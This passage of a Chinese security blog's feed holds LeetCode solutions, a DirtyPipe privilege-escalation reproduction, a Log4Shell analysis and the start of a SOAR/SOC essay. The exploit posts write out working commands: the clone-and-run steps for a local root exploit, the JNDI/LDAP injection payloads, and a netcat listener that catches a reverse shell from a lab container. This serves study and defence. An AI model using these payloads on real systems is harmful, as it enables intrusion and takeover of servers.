  </entry>
  
  <entry>
    <title>26. Remove Duplicates from Sorted Array</title>
    <link href="http://ciaofox.me/2022/05/04/LeetCode/26.%20Remove%20Duplicates%20from%20Sorted%20Array/"/>
    <id>http://ciaofox.me/2022/05/04/LeetCode/26.%20Remove%20Duplicates%20from%20Sorted%20Array/</id>
    <published>2022-05-04T14:48:30.000Z</published>
    <updated>2022-05-04T16:33:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://s2.loli.net/2022/05/04/LkyqXvTj9GCD48J.png"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这道题我被绕进去了导致花了挺久来思考，其实很简单。重点在于三个地方：1、不能为另一个数组生成额外空间，不然的话直接塞新数组里面就完事。2、新数组后面部分是什么无所谓。3、目标的数组是一个排了序的数组。所以这道题只需要遍历数组，发现重复的就把后面的往前挪并且覆盖掉重复的就行。。具体说，可以维护2个指针，慢指针开始指向数组第一个元素，快指针指向第二个元素，然后快指针不断判断自己当前元素和前一个元素是否相同，相同则快指针后移，不相同则将当前值赋值给慢指针的后一个元素，慢指针后移。最后慢指针指向的元素及前面所有元素都是不重复的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class Solution(object):</span><br><span class="line">    def removeDuplicates(self, nums):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        :type nums: List[int]</span><br><span class="line">        :rtype: int</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        if len(nums)&lt;=1:</span><br><span class="line">            return len(nums)</span><br><span class="line">        count = 0</span><br><span class="line">        for i in range(len(nums)):</span><br><span class="line">            if nums[count] != nums[i]:</span><br><span class="line">                count += 1</span><br><span class="line">                nums[count] = nums[i]</span><br><span class="line">        return count + 1</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">第二道题</summary>
    
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>1. Two Sum</title>
    <link href="http://ciaofox.me/2022/05/04/LeetCode/1.%20Two%20Sum/"/>
    <id>http://ciaofox.me/2022/05/04/LeetCode/1.%20Two%20Sum/</id>
    <published>2022-05-04T10:25:27.000Z</published>
    <updated>2022-05-04T16:32:57.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://s2.loli.net/2022/05/04/XrpWzQvE6ZfYOxT.png"></p><p><a href="https://leetcode.com/problems/two-sum/">https://leetcode.com/problems/two-sum/</a></p><p>这是leetcode第一道题，说实话要做出来很简单。暴力加减就行。简单看了看高级一些的做法，基本都是和hash表有关，等第二遍的时候再看吧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class Solution(object):</span><br><span class="line">    def twoSum(self, nums, target):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        :type nums: List[int]</span><br><span class="line">        :type target: int</span><br><span class="line">        :rtype: List[int]</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        for i in range(len(nums)):</span><br><span class="line">            for j in range(i+1,len(nums)):</span><br><span class="line">                if nums[j]==target-nums[i]:</span><br><span class="line">                    return [i,j]</span><br></pre></td></tr></table></figure><p>例程和我基本完全一致，但是有一个地方引起了我的注意。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def twoSum(self, nums: List[int], target: int) -&gt; List[int]:</span><br></pre></td></tr></table></figure><p>从stackoverflow上找到了答案：<a href="https://stackoverflow.com/questions/56506017/what-is-the-meaning-of-listint-in-this-function-declaration">https://stackoverflow.com/questions/56506017/what-is-the-meaning-of-listint-in-this-function-declaration</a></p><p>简单来说是一种python3的特性，叫做type hint(or function annotation)</p><p>-&gt; List[int] means that the function should return a list of integers.</p><p>nums: List[int], target: int means that nums is expected to be a list of integers and that target is expected to be an integer.</p><p>我理解为一个类型提示，用于表达这里的变量或者数组本来应该是什么类型。而且可以使用某些函数进行额外的检查。</p>]]></content>
    
    
    <summary type="html">第一道题</summary>
    
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>DirtyPipe（CVE-2022-0847）</title>
    <link href="http://ciaofox.me/2022/03/10/600%20Privilege%20Escalation%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/DirtyPipe(CVE-2022-0847)/"/>
    <id>http://ciaofox.me/2022/03/10/600%20Privilege%20Escalation%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/DirtyPipe(CVE-2022-0847)/</id>
    <published>2022-03-10T05:11:23.000Z</published>
    <updated>2022-06-16T09:16:02.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DirtyPipe-CVE-2022-0847"><a href="#DirtyPipe-CVE-2022-0847" class="headerlink" title="DirtyPipe CVE-2022-0847"></a>DirtyPipe CVE-2022-0847</h1><p>漏洞类型：内核提权漏洞</p><p>描述：可以覆盖任意只读文件中的数据，并获得 root 权限。</p><p>漏洞影响范围：5.8 &lt;= Linux 内核版本 &lt; 5.16.11 / 5.15.25 / 5.10.102</p><p>复现环境：5.10.0-kali3-amd64</p><p>参考链接</p><p><a href="https://blog.csdn.net/WWL0814/article/details/123354623">https://blog.csdn.net/WWL0814/article/details/123354623</a></p><p><a href="https://github.com/imfiver/CVE-2022-0847">https://github.com/imfiver/CVE-2022-0847</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用Dirty-Pipe.sh文件进行提权</p><p>下载链接</p><p><a href="https://github.com/imfiver/CVE-2022-0847">https://github.com/imfiver/CVE-2022-0847</a></p><p>复现步骤</p><p>登录kali普通用户账号，查看下用户</p><p>whoami</p><p><img src="https://s2.loli.net/2022/06/16/hl8KN9X3vVPGfDo.png"></p><p>打开终端下载文件</p><pre><code>git clone https://github.com/imfiver/CVE-2022-0847.git</code></pre><p><img src="https://s2.loli.net/2022/06/16/X38NQyJvmV2Elnc.png"></p><p>进入文件目录</p><pre><code>cd CVE-2022-0847</code></pre><p><img src="https://s2.loli.net/2022/06/16/kAcLZjdBSPOEua4.png"></p><p>查看下目录中内容</p><pre><code>ls</code></pre><p><img src="https://s2.loli.net/2022/06/16/PUDVkNvmj2gJxB3.png"></p><p>运行Dirty-Pipe.sh文件</p><pre><code>bash Dirty-Pipe.sh</code></pre><p><img src="https://s2.loli.net/2022/06/16/Z1O9JudfV7ilvNm.png"></p><p>可以看到已经进入root了，用whoami看看</p><pre><code>whoami</code></pre><p><img src="https://s2.loli.net/2022/06/16/jNBrZqhRaSz62Qp.png"></p>]]></content>
    
    
    <summary type="html">这个漏洞以其易用性，危害性，泛用性成为了2022年威胁最大的漏洞之一。我猜测它会成为之后五年最好用的提权漏洞之一（也许没有之一）。本文会描述该漏洞的利用方式和一部分原理。</summary>
    
    
    
    <category term="600 Privilege Escalation 权限提升" scheme="http://ciaofox.me/categories/600-Privilege-Escalation-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    
    <category term="漏洞复现" scheme="http://ciaofox.me/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="原理分析" scheme="http://ciaofox.me/tags/%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
    
    <category term="提权漏洞" scheme="http://ciaofox.me/tags/%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>雪崩-log4j漏洞粗谈</title>
    <link href="http://ciaofox.me/2021/12/13/400%20Execution%20%E6%94%BB%E5%87%BB/%E9%9B%AA%E5%B4%A9-log4j%E6%BC%8F%E6%B4%9E%E7%B2%97%E8%B0%88/"/>
    <id>http://ciaofox.me/2021/12/13/400%20Execution%20%E6%94%BB%E5%87%BB/%E9%9B%AA%E5%B4%A9-log4j%E6%BC%8F%E6%B4%9E%E7%B2%97%E8%B0%88/</id>
    <published>2021-12-13T07:51:56.000Z</published>
    <updated>2022-06-21T03:18:39.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是log4j2"><a href="#什么是log4j2" class="headerlink" title="什么是log4j2"></a>什么是log4j2</h1><p>我们先看<a href="https://logging.apache.org/">Apache log4j的官方网站上的描述</a>：</p><blockquote><p>Apache Log4j 2 is an upgrade to Log4j that provides significant improvements over its predecessor, Log4j 1.x, and provides many of the improvements available in Logback while fixing some inherent problems in Logback’s architecture.</p></blockquote><p>或者我们采用<a href="https://zh.wikipedia.org/wiki/Log4j">wikipedia对它的描述</a></p><blockquote><p>Apache Log4j is a Java-based logging utility originally written by Ceki Gülcü. It is part of the Apache Logging Services, a project of the Apache Software Foundation. Log4j is one of several Java logging frameworks.<br>Gülcü has since started the SLF4J and Logback[4] projects, with the intention of offering a successor to Log4j.<br>The Apache Log4j team developed Log4j 2 [5] in response to the problems of Log4j 1.2, 1.3, java.util.logging and Logback, addressing issues which appeared in those frameworks.[6] In addition, Log4j 2 offered a plugin architecture which makes it more extensible than its predecessor. Log4j 2 is not backwards compatible with 1.x versions,[7] although an “adapter” is available. On August 5, 2015, the Apache Logging Services Project Management Committee announced that Log4j 1 had reached end of life and that users of Log4j 1 were advised to upgrade to Apache Log4j 2.[8]</p></blockquote><p>或者干脆采用百度的说法：</p><blockquote><p>Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。</p></blockquote><p>很显然，这是java一个最基础的，功能强大的，适配性极强的开源日志模块。它的使用范围非常广，这也就意味着这次漏洞的影响范围非常大。</p><h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>这个漏洞在2021年12月9日被<a href="https://help.aliyun.com/noticelist/articleid/1060971232.html" title="万恶之源">阿里云应急响应中心直接公布</a>（我真的很怀疑这不违反漏洞管理方法吗？）（更新下，阿里云因为违法漏洞管理方法被处罚了，笑死。）。发布时间我没记错的话应该是在傍晚，无数公司为了它整夜响应，log4j官方快速释放出log4j-2.15.0-rc1，但是该版本据传依然存在绕过，后续log4j2接连放出了log4j-2.15.0-rc2、log4j-2.16、log4j-2.17等版本，完全修复了该漏洞的利用环。</p><p>说回漏洞。在9号时候阿里云公布的不只是漏洞存在情况，还包括验证POC和漏洞原理。漏洞的原理其实非常简单，log4j会默认打印error和fatal级别的日志，当日志信息中存在特定构造的参数时候，会执行JndiLookup方法进行进一步处理，最终加载由攻击者传入的LDAP服务端地址，然后返回一个恶意的JNDI Reference对象，触发漏洞，实现 RCE。（当然目前的POC大多是用DNS查询记录来验证）</p><p><img src="https://s2.loli.net/2022/03/11/R82sAHu3UZNnpwt.png" alt="这张图我感觉说得比较明白，来自于微信公众号【研磨架构】"></p><p>漏洞编号为<strong>CVE-2021-44228</strong></p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><h3 id="版本影响"><a href="#版本影响" class="headerlink" title="版本影响"></a>版本影响</h3><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">根据CVE所描述的范围：</a></p><blockquote><p>Apache Log4j2 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0, this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.</p></blockquote><p>漏洞存在的版本为2.0-beta9 &lt;= Apache Log4j &lt;= 2.15.0-rc1间的所有版本。而log4j 1的所有版本都不存在这个漏洞。</p><h3 id="供应链影响范围"><a href="#供应链影响范围" class="headerlink" title="供应链影响范围"></a>供应链影响范围</h3><p>经不完全统计，直接和间接引用Log4j的开源组件共计超过17万个；</p><p>log4j的1～4层引用关系：直接引用log4j的组件有6960个，第二层引用的超过3万个，第三层超过9万个，第四层超过16万个，总计有173200+个开源组件受Log4j漏洞影响。</p><p>已知受影响应用及组件：</p><p>VMware大部分产品</p><p>Jedis</p><p>Logging</p><p>Logstash</p><p>HikariCP</p><p>Hadoop Hive</p><p>ElasticSearch</p><p>Apache Solr</p><p>Apache Struts2</p><p>Apache Flink</p><p>Apache Druid</p><p>Apache Log4j SLF4J  Binding</p><p>spring-boot-strater-log4j2</p><p>Camel :: Core</p><p>JBoss  Logging 3</p><p>JUnit Vintage Engine</p><p>WSO2 Carbon Kernel  Core</p><p>直接引用log4j的组件可参考如下链接：</p><p><a href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages?p=1">https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages?p=1</a></p><p>关于攻击趋势相关内容建议看这篇360应急响应的文章：<a href="https://blog.netlab.360.com/apache-log4j2-vulnerability-attack-trend-from-the-perspective-of-honeypot/"><strong>360 Netlab Blog - Network Security Research Lab at 360—从蜜罐视角看Apache Log4j2漏洞攻击趋势</strong></a></p><p>另外说起来的话，官方第一时间释出的log4j 2.15.0-rc1据说是存在RCE漏洞，但是实际上该漏洞需要去修改其默认配置，让<a href="https://twitter.com/pwntester/status/1471482513218584578?s=20">本来已经禁用了JNDI的配置重新启用…</a>我是真的想不出来到底什么业务才会这么执着地需要JNDI来执行？而log4j 2.15.0还<a href="https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/">存在一些问题</a>，其中比较严重的是一个DoS攻击，所以推荐是升级到2.16版本。</p><p>log4j-2.17.0是为了修复CVE-2021-45105，一个DoS漏洞。</p><blockquote><p>Apache Log4j2 版本 2.0-alpha1 到 2.16.0 没有防止 self-referential 查找的不受控制的递归。当日志配置使用非默认的 Pattern Layout 与 Context Lookup（例如，$${ctx:loginId}）时，控制线程上下文映射 (MDC) 输入数据的攻击者可以制作包含递归查找的恶意输入数据，导致 StackOverflowError，从而终止进程。这也称为 DoS 攻击。<br>从 2.17.0 版本开始（针对 Java 8），只有配置中的查找字符串才会被递归扩展；在任何其他用法中，仅解析顶层查找，不解析任何嵌套查找。</p></blockquote><p>（29日更新一下，2.17.0版本出现了一个RCE漏洞，<a href="https://www.cve.org/CVERecord?id=CVE-2021-44832">CVE-2021-44832</a>，但又是需要去修改默认配置文件的漏洞。Jesus，这事没完了是吧？在<a href="https://www.cnpanda.net/talksafe/1157.html">这篇文章</a>中有关于log4j后续漏洞的讨论，我非常赞成其总结：<strong>通过配置文件来实现 RCE，只能说是一种手段，而不能说是一种常规漏洞。</strong>)</p><h2 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h2><p>2021-11-24 阿里云安全团队向Apache 官方提交ApacheLog4j2远程代码执行漏洞（CVE-2021-44228）</p><p>2021-12-05 官方增加两处commit修复漏洞</p><p>2021-12-07 官方发布2.15.0-rc1 版本</p><p>2021-12-09 阿里云安全响应团队发布漏洞风险提示</p><p>2021-12-10 官方紧急发布2.15.0-rc2版本修复rc1版本绕过问题</p><p>2021-12-10 CVE颁发漏洞编号:CVE-2021-44228</p><p>2021-12-10 CNVD颁发漏洞编号:CNVD-2021-95914</p><p>2021-12-13 官方发布2.16.0 版本</p><p>2021-12-17 官方发布2.17.0 版本</p><p>2021-12-27 官方发布2.17.1 版本以修复CVE-2021-45105</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>漏洞发布时同时释出了POC和EXP，目前最常规的几种验证方法无非是：</p><p>1、用代码模拟一个最简的log4j或是JNDI或者lookup环境，输入payload，载入远程代码（其实就是本地的另一个端口），然后弹个计算器。<br>2、搭建一个（或者找一个）带有log4j2的环境，然后用DNSlog来判断是否成功</p><p>我个人感觉用代码层面去测试最多只能确认漏洞的存在，更细节的地方会有一些问题，所以在这里我们使用比较直观的方式2验证。</p><h2 id="DNS确认漏洞存在"><a href="#DNS确认漏洞存在" class="headerlink" title="DNS确认漏洞存在"></a>DNS确认漏洞存在</h2><h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><p>靶机：采用了docker搭建的方式，sprintboot框架加入log4j2日志模块实现了一个登录系统。<a href="https://github.com/Ode1esse/springboot-login-log4j2-docker">https://github.com/Ode1esse/springboot-login-log4j2-docker</a></p><p>DNS服务器：<a href="https://ceye.io/">https://ceye.io</a></p><p>DNS验证网址：<a href="https://test.z**tzt.ceye.io/">https://test.z**tzt.ceye.io</a></p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>搭建过程没什么好说的，地址里面有docker-compose.yml，直接载入搭建就好。docker搭建本来就很轻松。搭建之后应该是这样的效果：<br><img src="https://s2.loli.net/2022/01/05/EgnptS8GA6a1PrM.png" alt="毫无任何花哨的界面"></p><p>然后将payload分别插入账号和密码处，这里我们插入不同的dns地址，从而实现不同的区分，来确定薄弱点存在于哪里。（这也是fuzzing的思维）</p><p>这里返回了一个账号密码错误（当然是错误的）</p><p><img src="https://s2.loli.net/2022/03/04/rp1ct2CTOh38mxg.png" alt="这里我换了一下IP地址"></p><p>然后我们查看一下DNS平台是否有解析记录。<br><img src="https://s2.loli.net/2022/03/04/iRhjODoF89Z5TVr.png"></p><p>显然只有username字段，也即是用户名字段触发了漏洞，导致服务器端向该url发送DNS请求。到这里我们实际上已经确认存在了漏洞的存在，但是为什么只有在username字段插入payload才生效呢？</p><p>log4j2 shell漏洞的原理是日志框架从日志中识别到JNDI后才会调用方法，实现RCE。那么我们可以进入到docker内部去查看一下日志。<br><img src="https://s2.loli.net/2022/03/04/FYtJBoOauVCcDx2.png"></p><p>可以看出我们刚刚的错误是最后一条。<br><img src="https://s2.loli.net/2022/03/04/Qib7MUO5doFt2SX.png"></p><p>其中记录了时间，错误类型，还有账号名。日志中只会保存账号名，所以只有在账号名处插入payload才会被log4j2框架解析，执行JNDI方法从远端请求资源。</p><p>如果之后利用此漏洞的话，需要提前注意目标会储存哪些信息进日志，大部分系统会储存错误信息中的IP，账号和密码，少数会额外存储User-Agent字段，可以对此进行fuzzing。</p><h2 id="利用漏洞获取shell"><a href="#利用漏洞获取shell" class="headerlink" title="利用漏洞获取shell"></a>利用漏洞获取shell</h2><h3 id="漏洞环境-1"><a href="#漏洞环境-1" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><p>本次的教程全程参考此链接：<a href="https://raxis.com/blog/log4j-exploit">https://raxis.com/blog/log4j-exploit</a> （纯英文）</p><p>所需要的github库为： <a href="https://github.com/kozmer/log4j-shell-poc">https://github.com/kozmer/log4j-shell-poc</a></p><p>在kali虚拟机内使用docker搭建了靶机，并且在本地打开了log4j2 shell的恶意类与NC监听服务。当payload发送到靶机时将会触发靶机访问恶意类，并回弹shell到NC监听的端口，实现RCE。</p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>从github克隆下来的仓库中有需要的几乎所有东西，并且在它的README中也包含了几乎所有教程。按照它们走就好。</p><p>首先按照文件pip所需要的东西。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>打开nc并且监听9001端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/10/7C21gdEJQOa3sfF.png"></p><p>搭建docker靶机，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd log4j-shell-poc/</span><br><span class="line">sudo docker build -t log4j-shell-poc .</span><br><span class="line">sudo docker run --network host log4j-shell-poc</span><br></pre></td></tr></table></figure><p>搭建成功后可以通过访问<a href="http://localhost:8080/">http://localhost:8080/</a> 找到你的访问网页。</p><p>开始构造漏洞利用恶意类，注意我们需要手动下载java对应版本jdk，这里推荐使用<code>java-8u20</code>.</p><p>获取jdk及具体操作：<a href="https://github.com/kozmer/log4j-shell-poc#getting-the-java-version">https://github.com/kozmer/log4j-shell-poc#getting-the-java-version</a></p><p>下载java版本的地址（需要注册oracle账号）：<a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><p>下载后将 <code>jdk1.8.0_20</code> 文件复制到<code>log4j-shell-poc</code>文件夹中，开始启用恶意类。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python3 poc.py --userip localhost --webport 8000 --lport 9001</span><br><span class="line"></span><br><span class="line">[!] CVE: CVE-2021-44228</span><br><span class="line">[!] Github repo: https://github.com/kozmer/log4j-shell-poc</span><br><span class="line"></span><br><span class="line">[+] Exploit java class created success</span><br><span class="line">[+] Setting up fake LDAP server</span><br><span class="line"></span><br><span class="line">[+] Send me: $&#123;jndi:ldap://localhost:1389/a&#125;</span><br><span class="line"></span><br><span class="line">Listening on 0.0.0.0:1389</span><br></pre></td></tr></table></figure><p>开始复现，在用户名框输入payload：<code>$&#123;jndi:ldap://localhost:1389/a&#125;</code>，密码可以随便输入</p><p>分别查看恶意类和nc服务。<br><img src="https://s2.loli.net/2022/03/10/MdyYcIOrAC1tapB.png"></p><p><img src="https://s2.loli.net/2022/03/10/Z6yKu5TJSB23tio.png"></p><p>显然这里NC已经受到了回弹的shell，测试一下。<br><img src="https://s2.loli.net/2022/03/10/F1L6vZiKMxPzRoC.png"></p><p>成功复现。</p><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>本章受制于作者的java水平（是的我和大部分安全人员一样主要写python），所以本节只能粗浅地尝试探究一下漏洞的原理。本节末尾会附上一些写得不错的原理分析文章，如果感兴趣可以借助这些文章更加深入。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>触发漏洞的关键点在于两个部分：</p><p>1.org.apache.logging.log4j.core.pattern.MessagePatternConverter 的 format() 方法（表达式内容替换）：</p><p>这部分内容重点就在于代码的主要内容就是一旦发现日志中包含 ${ 就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行。</p><p>在 ${ 中可以使用的关键词可以通过<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">官方文档查看</a>：</p><p>2.apache.logging.log4j.core.lookup.StrSubstitutor（提取字符串，并通过 lookup 进行内容替换）</p><p>日志在打印时当遇到 ${ 后，Interpolator 类以:号作为分割，将表达式内容分割成两部分，前面部分作为 prefix，后面部分作为 key。然后通过 prefix 去找对应的 lookup，通过对应的 lookup 实例调用 lookup 方法，最后将 key 作为参数带入执行。</p><p>由于log4j2 支持很多协议，例如通过 ldap 查找变量，通过 docker 查找变量，通过rmi等等。目前看到使用最多的主要是使用ldap来构造payload:</p><p><strong>${jndi:ldap://ip/port/exp}</strong></p><p>最终效果就是通过 jndi 注入，借助 ldap 服务来下载执行恶意 payload，从而执行命令，整个利用流程如图所示：</p><p><img src="https://s2.loli.net/2022/03/11/MOhP6NdET7si4uH.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>整个利用流程分两步：</p><p>第一步：向目标发送指定 payload，目标对 payload 进行解析执行，然后会通过 ldap 链接远程服务，当 ldap 服务收到请求之后，将请求进行重定向到恶意 java class 的地址。</p><p>第二步：目标服务器收到重定向请求之后，下载恶意 class 并执行其中的代码，从而执行系统命令。</p><p>关于利用LDAP服务来进行注入攻击已经不是第一次了，JNDI注入，即某代码中存在JDNI的string可控的情况，可构造恶意RMI或者LDAP服务端，导致远程任意类被加载，造成任意代码执行。Fastjson RCE漏洞的利用也用到LDAP注入攻击，还有其他的一些。</p><p><img src="https://s2.loli.net/2022/03/11/R82sAHu3UZNnpwt.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/vuls/317446.html">https://www.freebuf.com/vuls/317446.html</a></p><p><a href="https://www.freebuf.com/sectool/313774.html">https://www.freebuf.com/sectool/313774.html</a></p><p><a href="http://blog.topsec.com.cn/java-jndi%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3/">http://blog.topsec.com.cn/java-jndi注入知识详解/</a></p><p><a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">https://logging.apache.org/log4j/2.x/manual/lookups.html</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个漏洞在我看来就像是《雪崩》中的图片病毒，只要简单接触就可以轻松地控制一个系统的所有权限或是让它彻底瘫痪。同时它也是一场雪崩，全面地席卷了整个安全圈，几乎所有大公司都在影响范围中。在未来几年的护网中，它可能和shiro一起成为主要突破点。</p><p>这个漏洞并不复杂，简单到甚至看看官方文档都有可能发现，因为它根植于log4j2的正常功能，但是这么久了都没被发现，这部分说明了大家对于开源工具的松懈。过去开源一直是安全/稳定的代名词，公司对开源都会默认是安全的，因为“肯定有很多人看过代码，如果有问题早就发现了”，使用越广的开源工具越是如此。但log4j2事件直接戳破了这个幻想——大家其实并不太看代码，都是拿来就用。</p><p>同时这件事再次强调了供应链安全，安全左移是必然的趋势，log4j2只是一个开始，还有多少底层开源组件里面存在着危险的漏洞？公司不敢赌，所以必然会加强审查。开源卫士/代码卫士/黑鸭（black duck)这些代码审计服务的出现和盛行就是一个显著的信号。</p><p>那么作为一位安全人员，这是否又是一个新的机会呢？</p>]]></content>
    
    
    <summary type="html">2021年最重量级的CVE-2021-44228漏洞在12月9日被引爆，无数程序员和安全人员都在对其进行应急响应，恰如那个很老的科幻小说《雪崩》，一枚核弹，一个漏洞，没有安全人员可以幸免，我当然也是其中之一。本文主要描述了对漏洞的一些探究与粗浅分析。</summary>
    
    
    
    <category term="400 Execution 攻击" scheme="http://ciaofox.me/categories/400-Execution-%E6%94%BB%E5%87%BB/"/>
    
    
    <category term="漏洞复现" scheme="http://ciaofox.me/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="原理分析" scheme="http://ciaofox.me/tags/%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
    
    <category term="远程代码执行" scheme="http://ciaofox.me/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>SOAR，SOC和安全</title>
    <link href="http://ciaofox.me/2021/08/25/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/SOAR%EF%BC%8CSOC%E5%92%8C%E5%AE%89%E5%85%A8/"/>
    <id>http://ciaofox.me/2021/08/25/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/SOAR%EF%BC%8CSOC%E5%92%8C%E5%AE%89%E5%85%A8/</id>
    <published>2021-08-25T02:19:12.000Z</published>
    <updated>2022-03-15T09:25:40.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>毕业之后因为疫情找不到好的渗透岗，一度考虑去做安全运维，最后机缘巧合去了一家安全集成公司，什么都做，每天都感觉在打杂。这个过程很痛苦，但是也让我对安全运营有了一定的了解和思考。而后续在一些hw和重保中，我对于安全运维也开始有一些更进一步的看法了。</p><p>当我看到SOAR的概念时，很自然地，我将其与SOC平台进行了比较。它们之间有一条很细微的区分界限，这条线很难把握但又确实存在。我希望通过这篇文章对SOAR和SOC进行一个稍微深入一些的探究。</p><h2 id="从源头探究起：什么是SOAR（Security-Orchestration-Automation-and-Response）？"><a href="#从源头探究起：什么是SOAR（Security-Orchestration-Automation-and-Response）？" class="headerlink" title="从源头探究起：什么是SOAR（Security Orchestration, Automation and Response）？"></a>从源头探究起：什么是SOAR（Security Orchestration, Automation and Response）？</h2><p>从各种资料中我们不难发现SOAR的定义最初在2017年由Gartner创造，<a 